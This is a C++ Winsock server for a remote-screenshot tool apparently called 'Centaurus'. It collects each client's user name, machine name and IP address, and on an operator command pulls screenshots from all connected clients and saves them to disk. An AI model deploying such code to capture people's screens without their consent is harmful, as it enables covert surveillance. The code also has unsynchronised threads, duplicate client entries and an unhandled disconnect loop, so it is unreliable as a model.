#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <cstring>

#include "Server.h"

#include <fstream>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Server::Server(u_short port)
    : m_port(port)
    , m_serverRunning(true)
{
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    if (WSAStartup(ver, &wsData) != 0)
    {
        std::cerr << "Can't initialize Winsock! Quitting" << std::endl;
        stop();
    }

    m_listeningSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_listeningSocket == INVALID_SOCKET)
    {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        WSACleanup();
        stop();
    }

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = INADDR_ANY;

    if (bind(m_listeningSocket, (sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR)
    {
        std::cerr << "Can't bind socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        stop();
    }

    if (listen(m_listeningSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        std::cerr << "Can't listen on socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        stop();
    }
}

Server::~Server() {
    stop();
}

/**
 * Начало сеанса.
 */
void Server::start() {
    std::thread acceptThread(&Server::acceptClients, this);
    std::thread commandThread(&Server::processCommands, this);
    acceptThread.join();
    commandThread.join();
}

/**
 * Завершение сеанса.
 */
void Server::stop() {
    m_serverRunning = false;

    for (const auto& client : m_clients)
    {
        send(client.sock, "exit", 4, 0);
        closesocket(client.sock);
    }

    closesocket(m_listeningSocket);
    WSACleanup();
}

void Server::CopyReceivedString(const std::string& source, char* destination, size_t destSize) {
    if (!source.empty())
    {
        std::strncpy(destination, source.c_str(), destSize - 1);
        destination[destSize - 1] = '\0';
    }
    else
    {
        destination[0] = '\0';
    }
}

/**
 * Прослушка клиентов.
 * @param clientSocket Сокет клиента.
 */
void Server::handleClient(const SOCKET clientSocket) {
    FClientInfo clientInfo;

    while (m_serverRunning) {
        std::string command = receiveString(clientSocket);

        if (command.empty()) {
            std::cout << "Client disconnected.\n" << clientInfo;
            m_clients.erase(std::remove_if(m_clients.begin(), m_clients.end(),
                [clientSocket](const FClientInfo& client)
                {
                    return client.sock == clientSocket;
                }), m_clients.end());

            break;
        }
        if (command == Centaurus::cmd::connect) {
            std::string receivedTime = receiveString(clientSocket);
            std::string receivedUser = receiveString(clientSocket);
            std::string receivedName = receiveString(clientSocket);
            std::string receivedIPv4 = receiveString(clientSocket);

            CopyReceivedString(receivedTime, clientInfo.time, sizeof(clientInfo.time));
            CopyReceivedString(receivedUser, clientInfo.user, sizeof(clientInfo.user));
            CopyReceivedString(receivedName, clientInfo.name, sizeof(clientInfo.name));
            CopyReceivedString(receivedIPv4, clientInfo.ipv4, sizeof(clientInfo.ipv4));
            
            m_clients.push_back(clientInfo);
            
            std::cout << "Client connected:\n" << clientInfo;
        }
        else if (command == Centaurus::cmd::screenshot) {
            std::cout << "Requesting screenshot..." << std::endl;

            // Получаем размер данных скриншота
            int dataSize;
            int sizeReceived = recv(clientSocket, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
            if (sizeReceived == SOCKET_ERROR) {
                std::cerr << "Failed to receive size of screenshot, error: " << WSAGetLastError() << std::endl;
                break;
            }

            std::vector<char> screenshotData = receiveData(clientSocket, dataSize);
            if (screenshotData.empty()) return;
            
            // Сохраняем скриншот в файл
            std::string scnFileName = clientInfo.user;
            scnFileName.append("_");
            scnFileName.append(clientInfo.ipv4);
            scnFileName.append(".bmp");
            std::string outPath = std::string(CONTENT_PATH) + '/' + scnFileName;
            std::ofstream outFile(outPath, std::ios::binary);
            outFile.write(screenshotData.data(), screenshotData.size());
            outFile.close();
            std::cout << "Screenshot saved as " << outPath << std::endl;
        }
    }

    closesocket(clientSocket);
}

std::vector<char> Server::receiveData(SOCKET clientSocket, int dataSize) {
    std::vector<char> buffer(dataSize);
    int totalBytesReceived = 0;
    
    while (totalBytesReceived < dataSize) {
        int bytesRead = recv(clientSocket, buffer.data() + totalBytesReceived, dataSize - totalBytesReceived, 0);
        if (bytesRead == SOCKET_ERROR) {
            std::cerr << "Error receiving data, error: " << WSAGetLastError() << std::endl;
            return {};
        }
        totalBytesReceived += bytesRead;
    }
    
    return buffer;
}

std::string Server::receiveString(SOCKET clientSocket) {
    int strSize;
    int sizeReceived = recv(clientSocket, reinterpret_cast<char*>(&strSize), sizeof(strSize), 0);
    if (sizeReceived == SOCKET_ERROR || strSize <= 0) {
        std::cerr << "Failed to receive string size, error: " << WSAGetLastError() << std::endl;
        return "";
    }

    std::vector<char> stringData = receiveData(clientSocket, strSize);
    if (stringData.empty()) {
        return "";
    }

    return std::string(stringData.begin(), stringData.end());
}


/**
 * Прослушка новых клиентов.
 */
void Server::acceptClients() {
    while (m_serverRunning)
    {
        sockaddr_in client;
        int clientSize = sizeof(client);
        SOCKET clientSocket = accept(m_listeningSocket, (sockaddr*)&client, &clientSize);

        if (clientSocket == INVALID_SOCKET)
        {
            std::cerr << "Invalid client socket" << std::endl;
            continue;
        }
        
        m_clients.emplace_back();
        m_clients.back().sock = clientSocket;
        m_clientThreads.emplace_back(&Server::handleClient, this, clientSocket);
    }
}

/**
 * Реализация команд сервера.
 */
void Server::processCommands() {
    std::string command;
    while (m_serverRunning)
    {
        std::cin >> command;

        if (command == Centaurus::cmd::screenshot)
        {
            for (const auto &client : m_clients)
            {
                send(client.sock, command.c_str(), command.size() + 1, 0);
            }
        }
        else if (command == Centaurus::cmd::list)
        {
            std::cout << "Connected clients:" << '\n';
            for (const auto& client : m_clients) {
                std::cout << client;
            }
        }
        else if (command == Centaurus::cmd::exit)
        {
            stop();
        }
        else if (command == Centaurus::cmd::help)
        {
            std::cout << Centaurus::cmd::helpMsg << std::endl;
        }
        else
        {
            std::cerr << Centaurus::cmd::unknownMsg << std::endl;
        }
    }
}